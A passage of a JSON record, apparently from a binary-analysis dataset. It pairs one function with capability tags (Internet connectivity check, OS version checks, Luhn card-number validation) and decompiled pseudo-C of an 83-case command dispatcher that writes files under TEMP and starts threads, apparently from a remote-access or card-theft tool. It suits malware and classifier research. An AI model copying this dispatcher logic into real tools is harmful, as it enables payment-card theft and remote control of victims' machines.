{
    "00401074": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00401074(void)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint8_t *puVar14;\n    uint8_t *puVar15;\n    char *pcVar16;\n    ulong uVar17;\n    uint uStack20;\n    \n    uStack20 = 0x401082;\n    iVar4 = fcn.0041f3f0();\n    iVar4 = -iVar4;\n    iVar13 = *(&stack0x000014ec + iVar4);\n    uVar11 = *(&stack0x000014e4 + iVar4);\n    puVar15 = *(&stack0x000014e8 + iVar4);\n    if ((0 < iVar13) && (*0x422844 == *(&stack0x000014e0 + iVar4))) {\n        *(&stack0x00000004 + iVar4) = 1;\n        *(&stack0x00000000 + iVar4) = iVar13;\n        *(&stack0xfffffffc + iVar4) = puVar15;\n        *(&stack0xfffffff8 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = 0x42e280;\n        *(&stack0xfffffff0 + iVar4) = 0x42e4a0;\n        *(&stack0xffffffec + iVar4) = 0x4010d4;\n        fcn.00403cb2();\n    }\n    // switch table (83 cases) at 0x422a1c\n    switch(uVar11 + 0x69 & 0xff) {\n    case 0:\n        *(&stack0xfffffff4 + iVar4) = 0x200;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401107;\n        fcn.0041317c();\n        *(&stack0xfffffff4 + iVar4) = 0x40;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401117;\n        fcn.0041321e();\n        *(&stack0xfffffffc + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0x00000000 + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xfffffff8 + iVar4) = \"%s\\a%s\\a\";\n        *(&stack0xfffffff4 + iVar4) = 0x1000;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40113e;\n        uVar8 = fcn.004127a8();\n        *(&stack0xfffffff8 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffffc + iVar4) = uVar8;\n        *(&stack0xfffffff4 + iVar4) = 0x97;\n        goto code_r0x0040122d;\n    case 4:\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff8 + iVar4) = puVar15 + 0x20;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x40116d;\n        cVar3 = fcn.0040a3de();\n        if (cVar3 == '\\0') {\n            *(&stack0xfffffff0 + iVar4) = 10000;\n            *(&stack0xffffffec + iVar4) = 0x40124d;\n            fcn.00407ef4();\n            *(&stack0xfffffff0 + iVar4) = &stack0x000014e0 + iVar4;\n            *(&stack0xffffffec + iVar4) = 0x40125c;\n            fcn.00405999();\n            return;\n        }\n        *(&stack0xfffffff4 + iVar4) = 0x40;\n        *(&stack0xfffffff0 + iVar4) = &stack0x0000007c + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40119e;\n        fcn.004130e8();\n        *(&stack0xfffffff4 + iVar4) = 0x40;\n        *(&stack0xfffffff0 + iVar4) = &stack0x0000003c + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4011ae;\n        fcn.00413040();\n        *(&stack0xfffffff4 + iVar4) = 0x200;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4011be;\n        fcn.004134d1();\n        *(&stack0xfffffff4 + iVar4) = 0x200;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4011ce;\n        fcn.0041317c();\n        *(&stack0x00000008 + iVar4) = &stack0x0000007c + iVar4;\n        *(&stack0x00000018 + iVar4) = 0x42e244;\n        *(&stack0x00000014 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0x00000010 + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0x0000000c + iVar4) = &stack0x0000003c + iVar4;\n        *(&stack0x00000004 + iVar4) = 0x42e224;\n        *(&stack0x00000000 + iVar4) = 0x2003100;\n        *(&stack0xfffffffc + iVar4) = 1;\n        *(&stack0xfffffff8 + iVar4) = \"%c%.8x%s\\a%s @ %s\\a%s\\a%s\\a%s\\a\";\n        *(&stack0xfffffff4 + iVar4) = 0x1000;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40121d;\n        uVar8 = fcn.004127a8();\n        *(&stack0xfffffff8 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffffc + iVar4) = uVar8;\n        *(&stack0xfffffff4 + iVar4) = 0x9b;\n        goto code_r0x0040122d;\n    case 5:\n        *(&stack0xfffffff0 + iVar4) = 0x61c;\n        *(&stack0xffffffec + iVar4) = 0x40126d;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        puVar1 = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xffffffec + iVar4) = 0x4012a2;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffffc + iVar4) = iVar13 + 0x204;\n        *(&stack0xffffffec + iVar4) = 0x4012cc;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = puVar1;\n        *(&stack0xfffffff8 + iVar4) = 3;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xffffffec + iVar4) = 0x4012f0;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = puVar1;\n        *(&stack0xffffffec + iVar4) = 0x4012f8;\n        uVar8 = fcn.00412666();\n        *(iVar13 + 0x610) = uVar8;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffffc + iVar4) = puVar1;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xffffffec + iVar4) = 0x401322;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = \"TEMP\";\n        *(&stack0xffffffec + iVar4) = 0x40132e;\n        uVar8 = sub.msvcrt.dll_getenv();\n        *(&stack0xfffffff0 + iVar4) = \"%6\\\\%6.dfd\";\n        *(&stack0xffffffec + iVar4) = 0x40133c;\n        uVar9 = fcn.004081aa();\n        *(&stack0xfffffff8 + iVar4) = uVar9;\n        *(&stack0x00000000 + iVar4) = puVar1;\n        *(&stack0xfffffffc + iVar4) = uVar8;\n        *(&stack0xfffffff4 + iVar4) = 0x204;\n        *(&stack0xfffffff0 + iVar4) = iVar13 + 0x408;\n        *(&stack0xffffffec + iVar4) = 0x40135e;\n        fcn.004127a8();\n        uVar8 = *(&stack0x000014e0 + iVar4);\n        *(iVar13 + 0x614) = 0;\n        *(iVar13 + 0x618) = uVar8;\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        *(&stack0xfffffff0 + iVar4) = 0x41458d;\n        goto code_r0x00401632;\n    case 6:\n        *(&stack0xfffffff8 + iVar4) = 0x1000;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4013a0;\n        fcn.00412d73();\n        *(&stack0xfffffff4 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x4013b3;\n        fcn.00414470();\n        break;\n    case 8:\n        goto code_r0x004013e2;\n    case 9:\n        *(&stack0xfffffff0 + iVar4) = &stack0x000014e0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4013c7;\n        fcn.00405999();\n        *(&stack0xffffffec + iVar4) = 0x4013cc;\n        fcn.00401000();\n        *(&stack0xfffffff0 + iVar4) = 2000;\n        *(&stack0xffffffec + iVar4) = 0x4013d8;\n        fcn.00407ef4();\n        break;\n    case 10:\n        *(&stack0xffffffec + iVar4) = 0x4013e2;\n        fcn.004089ed();\n        goto code_r0x004013e2;\n    case 0xb:\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff0 + iVar4) = 0x42e220;\n        *(&stack0xffffffec + iVar4) = 0x40141c;\n        fcn.004092b2();\n        break;\n    case 0xc:\n        *(&stack0xfffffff0 + iVar4) = 0x61c;\n        *(&stack0xffffffec + iVar4) = 0x40142d;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401467;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xfffffffc + iVar4) = iVar13 + 0x204;\n        *(&stack0xffffffec + iVar4) = 0x401491;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffff8 + iVar4) = 3;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4014bc;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4014cb;\n        uVar8 = fcn.00412666();\n        *(iVar13 + 0x610) = uVar8;\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffff8 + iVar4) = 4;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x4014fc;\n        fcn.004129fb();\n        *(&stack0xfffffff8 + iVar4) = 0x10;\n        *(&stack0xfffffff0 + iVar4) = iVar13;\n        *(&stack0xfffffff4 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401517;\n        iVar7 = fcn.00412cd5();\n        (&stack0x0000007c)[iVar4] = 0x25;\n        pcVar5 = \"%s\\\\%s.%s\";\n        pcVar16 = &stack0x000000bc + iVar4;\n        for (iVar10 = 9; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *pcVar16 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n            pcVar16 = pcVar16 + 1;\n        }\n        (&stack0x0000007d)[iVar4] = 0x73;\n        (&stack0x0000007e)[iVar4] = 0x5c;\n        (&stack0x0000007f)[iVar4] = 0x25;\n        (&stack0x00000080)[iVar4] = 0x73;\n        (&stack0x00000081)[iVar4] = 0;\n        *(&stack0xfffffff0 + iVar4) = \"TEMP\";\n        if (iVar7 < 1) {\n            *(&stack0xffffffec + iVar4) = 0x4015a0;\n            uVar8 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffffc + iVar4) = uVar8;\n            *(&stack0xfffffff4 + iVar4) = 0x204;\n            *(&stack0xfffffff8 + iVar4) = &stack0x0000007c + iVar4;\n            *(&stack0x00000000 + iVar4) = &stack0x000004c0 + iVar4;\n            *(&stack0xfffffff0 + iVar4) = iVar13 + 0x408;\n            *(&stack0xffffffec + iVar4) = 0x4015d0;\n            fcn.004127a8();\n        }\n        else {\n            *(&stack0xffffffec + iVar4) = 0x40155e;\n            uVar8 = sub.msvcrt.dll_getenv();\n            *(&stack0xfffffffc + iVar4) = uVar8;\n            *(&stack0xfffffff4 + iVar4) = 0x204;\n            *(&stack0x00000004 + iVar4) = &stack0x000002bc + iVar4;\n            *(&stack0xfffffff8 + iVar4) = &stack0x000000bc + iVar4;\n            *(&stack0x00000000 + iVar4) = &stack0x000004c0 + iVar4;\n            *(&stack0xfffffff0 + iVar4) = iVar13 + 0x408;\n            *(&stack0xffffffec + iVar4) = 0x401599;\n            fcn.004127a8();\n        }\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffff8 + iVar4) = 5;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4015fb;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x40160a;\n        iVar7 = fcn.00412666();\n        *(iVar13 + 0x618) = 0;\n        *(iVar13 + 0x614) = 0;\n        *(iVar13 + 0x60c) = iVar7 != 0;\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        goto code_r0x0040162b;\n    case 0xd:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x40164b;\n        fcn.00406304();\n        break;\n    case 0xf:\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff8 + iVar4) = 0x204;\n        (&stack0x000006c5)[iVar4] = 0xa7;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        (&stack0x000006c4)[iVar4] = 0xa6;\n        *(&stack0x000006c8 + iVar4) = *(&stack0x000014e0 + iVar4);\n        (&stack0x000006cc)[iVar4] = 0;\n        *(&stack0xffffffec + iVar4) = 0x401691;\n        fcn.00412548();\ncode_r0x004019e7:\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x4019ef;\n        fcn.00406453();\n        break;\n    case 0x11:\n        *(&stack0xfffffff0 + iVar4) = 0x314;\n        *(&stack0xffffffec + iVar4) = 0x401c7e;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 != 0) {\n            *(&stack0x00000000 + iVar4) = 0x204;\n            *(&stack0xfffffffc + iVar4) = iVar13;\n            *(&stack0xfffffff8 + iVar4) = 1;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar15;\n            *(&stack0xffffffec + iVar4) = 0x401cac;\n            fcn.004129fb();\n            *(&stack0x00000000 + iVar4) = 0x104;\n            *(&stack0xfffffff8 + iVar4) = 2;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar15;\n            *(&stack0xfffffffc + iVar4) = iVar13 + 0x204;\n            *(&stack0xffffffec + iVar4) = 0x401cd6;\n            fcn.004129fb();\n            uVar8 = *(&stack0x000014e0 + iVar4);\n            *(iVar13 + 0x308) = 0;\n            *(iVar13 + 0x310) = 1;\n            *(iVar13 + 0x30c) = uVar8;\n            *(&stack0xfffffff4 + iVar4) = iVar13;\n            *(&stack0xfffffff0 + iVar4) = fcn.0040680d;\n            *(&stack0xffffffec + iVar4) = 0x401d04;\n            *0x42b330 = fcn.00407f08();\n        }\n        break;\n    case 0x13:\n        *0x42b330 = 0;\n        break;\n    case 0x14:\n        *(&stack0xfffffff0 + iVar4) = 0x230;\n        *(&stack0xffffffec + iVar4) = 0x4016a2;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        uVar2 = *puVar15;\n        puVar14 = puVar15 + 2;\n        *(iVar13 + 0x204) = 0;\n        *(iVar13 + 0x20c) = 0xab;\n        *(iVar13 + 0x20d) = 0xac;\n        *(iVar13 + 0x20e) = 0xad;\n        *(iVar13 + 0x208) = uVar2;\n        *(iVar13 + 0x210) = *(&stack0x000014e0 + iVar4);\n        *(iVar13 + 0x228) = puVar15[1];\n        if (uVar2 == 0) {\n            *(&stack0x00000000 + iVar4) = 0x204;\n            *(&stack0xfffffffc + iVar4) = iVar13;\n            *(&stack0xfffffff8 + iVar4) = 1;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar14;\n            *(&stack0xffffffec + iVar4) = 0x4017c6;\n            fcn.004129fb();\n            *(&stack0x00000000 + iVar4) = 0x1000;\n            *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n            *(&stack0xfffffff8 + iVar4) = 2;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar14;\n            *(&stack0xffffffec + iVar4) = 0x4017ea;\n            fcn.004129fb();\n            *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n            *(&stack0xffffffec + iVar4) = 0x4017f2;\n            uVar17 = fcn.004126af();\n            *(iVar13 + 0x220) = uVar17;\n            *(iVar13 + 0x224) = uVar17 >> 0x20;\n            *(&stack0xfffffff0 + iVar4) = iVar13;\n            *(&stack0xffffffec + iVar4) = 0x401806;\n            uVar17 = fcn.004074c5();\n            *(iVar13 + 0x218) = uVar17;\n            *(iVar13 + 0x21c) = uVar17 >> 0x20;\n        }\n        else if (uVar2 == 1) {\n            puVar1 = &stack0x000004c0 + iVar4;\n            *(&stack0x00000000 + iVar4) = 0x1000;\n            *(&stack0xfffffff8 + iVar4) = 1;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffffc + iVar4) = puVar1;\n            *(&stack0xfffffff0 + iVar4) = puVar14;\n            *(&stack0xffffffec + iVar4) = 0x401731;\n            fcn.004129fb();\n            *(&stack0xfffffff8 + iVar4) = 0x204;\n            *(&stack0xfffffff4 + iVar4) = iVar13;\n            *(&stack0xfffffff0 + iVar4) = puVar1;\n            *(&stack0xffffffec + iVar4) = 0x401745;\n            fcn.00412d73();\n            *(&stack0xfffffff8 + iVar4) = 0x204;\n            *(&stack0xfffffff4 + iVar4) = &stack0x000002bc + iVar4;\n            *(&stack0xfffffff0 + iVar4) = iVar13;\n            *(&stack0xffffffec + iVar4) = 0x401759;\n            fcn.00412c0f();\n            *(&stack0xfffffff0 + iVar4) = &stack0x000002bc + iVar4;\n            *(&stack0xffffffec + iVar4) = 0x401761;\n            fcn.00407b16();\n            *(&stack0x00000000 + iVar4) = 0x1000;\n            *(&stack0xfffffffc + iVar4) = puVar1;\n            *(&stack0xfffffff8 + iVar4) = 2;\n            *(&stack0xfffffff4 + iVar4) = 7;\n            *(&stack0xfffffff0 + iVar4) = puVar14;\n            *(&stack0xffffffec + iVar4) = 0x401785;\n            fcn.004129fb();\n            *(&stack0xfffffff0 + iVar4) = puVar1;\n            *(&stack0xffffffec + iVar4) = 0x40178d;\n            uVar17 = fcn.004126af();\n            *(iVar13 + 0x220) = uVar17;\n            *(iVar13 + 0x224) = uVar17 >> 0x20;\n        }\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        *(&stack0xfffffff0 + iVar4) = 0x413eb3;\n        goto code_r0x00401632;\n    case 0x15:\n        *(&stack0xfffffff8 + iVar4) = iVar13;\n        *(&stack0xfffffff4 + iVar4) = puVar15;\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401839;\n        fcn.004143f2();\n        break;\n    case 0x16:\n    case 0x1e:\n        *(&stack0xfffffff0 + iVar4) = *puVar15;\n        *(&stack0xffffffec + iVar4) = 0x4018ad;\n        fcn.00413a29();\n        break;\n    case 0x17:\n        *(&stack0xfffffff0 + iVar4) = 0x40a;\n        *(&stack0xffffffec + iVar4) = 0x401a69;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        *(iVar13 + 0x408) = puVar15[1] == 1;\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15 + 2;\n        *(&stack0xffffffec + iVar4) = 0x401aa5;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15 + 2;\n        *(&stack0xfffffffc + iVar4) = iVar13 + 0x204;\n        *(&stack0xffffffec + iVar4) = 0x401acf;\n        fcn.004129fb();\n        *(iVar13 + 0x409) = 1;\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        *(&stack0xfffffff0 + iVar4) = 0x40746e;\n        goto code_r0x00401632;\n    case 0x18:\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401b1f;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x104;\n        *(&stack0xfffffffc + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401b43;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x40;\n        *(&stack0xfffffffc + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 3;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401b67;\n        fcn.004129fb();\n        *(&stack0xfffffff0 + iVar4) = &stack0x000000bc + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401b6f;\n        uVar8 = fcn.00412666();\n        *(&stack0xfffffff4 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xfffffff8 + iVar4) = uVar8;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401b7f;\n        fcn.00406c2a();\n        break;\n    case 0x19:\n        *(&stack0x00000000 + iVar4) = 0x1000;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffffc + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401bb6;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 0x104;\n        *(&stack0xfffffffc + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 2;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401bda;\n        fcn.004129fb();\n        *(&stack0xfffffff4 + iVar4) = &stack0x000002bc + iVar4;\n        *(&stack0xfffffff0 + iVar4) = &stack0x000004c0 + iVar4;\n        *(&stack0xffffffec + iVar4) = 0x401be6;\n        cVar3 = fcn.00406e7f();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = 0xb0;\n        goto code_r0x0040122d;\n    case 0x1a:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401c0b;\n        cVar3 = fcn.00406e04();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = 0xb1;\n        goto code_r0x0040122d;\n    case 0x1b:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401c30;\n        cVar3 = fcn.00407ab6();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = 0xb2;\n        goto code_r0x0040122d;\n    case 0x1c:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401c55;\n        cVar3 = fcn.00407ba7();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = 0xb3;\n        goto code_r0x0040122d;\n    case 0x1d:\n        *(&stack0xfffffff0 + iVar4) = 0x214;\n        *(&stack0xffffffec + iVar4) = 0x40184a;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        uVar2 = *puVar15;\n        *(iVar13 + 0x210) = 1;\n        *(iVar13 + 0x204) = uVar2;\n        *(iVar13 + 0x208) = *(&stack0x000014e0 + iVar4);\n        *(iVar13 + 0x20c) = puVar15[1];\n        *(&stack0xfffffff8 + iVar4) = 0x204;\n        *(&stack0xfffffff4 + iVar4) = puVar15 + 2;\n        *(&stack0xfffffff0 + iVar4) = iVar13;\n        *(&stack0xffffffec + iVar4) = 0x401892;\n        fcn.00412548();\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        *(&stack0xfffffff0 + iVar4) = 0x413d4e;\n        goto code_r0x00401632;\n    case 0x1f:\n        *(&stack0xfffffff0 + iVar4) = 8;\n        *(&stack0xffffffec + iVar4) = 0x401edc;\n        puVar6 = sub.msvcrt.dll_malloc();\n        if (puVar6 != NULL) {\n            uVar2 = *puVar15;\n            *puVar6 = *(&stack0x000014e0 + iVar4);\n            *(puVar6 + 1) = uVar2 != 0;\n            *(&stack0xfffffff4 + iVar4) = puVar6;\n            *(&stack0xfffffff0 + iVar4) = fcn.004113b8;\n            *(&stack0xffffffec + iVar4) = 0x401f04;\n            *0x42b5d0 = fcn.00407f08();\n        }\n        break;\n    case 0x20:\n        *(&stack0xfffffff4 + iVar4) = iVar13;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401f29;\n        fcn.00411738();\n        break;\n    case 0x21:\n        *0x42b5d0 = 0;\n        break;\n    case 0x23:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401f3d;\n        fcn.00413748();\n        break;\n    case 0x25:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401f51;\n        fcn.0040a4bc();\n        break;\n    case 0x27:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401f65;\n        fcn.0040fe8c();\n        break;\n    case 0x29:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401f72;\n        cVar3 = fcn.00410193();\n        if (cVar3 == '\\0') {\n            return;\n        }\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        *(&stack0xfffffff8 + iVar4) = puVar15;\n        *(&stack0xfffffff4 + iVar4) = 0xc0;\n        goto code_r0x0040122d;\n    case 0x2a:\n        *(&stack0xfffffff0 + iVar4) = *(&stack0x000014e0 + iVar4);\n        *(&stack0xffffffec + iVar4) = 0x401f9e;\n        fcn.004146e1();\n        break;\n    case 0x2b:\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401fab;\n        fcn.004147fb();\n        break;\n    case 0x2c:\n        *(&stack0xfffffff0 + iVar4) = 0x61c;\n        *(&stack0xffffffec + iVar4) = 0x401fbc;\n        iVar13 = sub.msvcrt.dll_malloc();\n        if (iVar13 == 0) {\n            return;\n        }\n        *(&stack0x00000000 + iVar4) = 0x204;\n        *(&stack0xfffffffc + iVar4) = iVar13;\n        puVar1 = &stack0x000004c0 + iVar4;\n        *(&stack0xfffffff8 + iVar4) = 1;\n        *(&stack0xfffffff4 + iVar4) = 7;\n        *(&stack0xfffffff0 + iVar4) = puVar15;\n        *(&stack0xffffffec + iVar4) = 0x401ff1;\n        fcn.004129fb();\n        *(&stack0x00000000 + iVar4) = 